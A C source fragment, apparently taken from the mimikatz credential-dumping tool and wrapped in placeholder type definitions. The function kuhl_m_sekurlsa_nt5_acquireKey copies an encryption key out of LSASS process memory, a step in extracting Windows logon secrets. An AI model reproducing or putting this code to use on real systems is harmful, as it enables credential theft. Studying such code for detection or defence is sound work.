#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_7__   TYPE_2__ ;
typedef  struct TYPE_6__   TYPE_1__ ;

/* Type definitions */
struct TYPE_7__ {int /*<<< orphan*/  address; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_6__ {int /*<<< orphan*/  address; } ;
typedef  int SIZE_T ;
typedef  int /*<<< orphan*/  PVOID ;
typedef  TYPE_1__* PKULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  PBYTE ;
typedef  TYPE_2__ KULL_M_MEMORY_ADDRESS ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 scalar_t__ kull_m_memory_copy (TYPE_2__*,TYPE_1__*,int) ; 

BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
#if defined(_M_X64)
	LONG offset64;
	aLocalMemory.address = &offset64;
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
	{
		aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
		aLocalMemory.address = &aLsassMemory->address;
#elif defined(_M_IX86)
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
	{
#endif
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
			aLocalMemory.address = Key;
			status = kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille);
		}
	}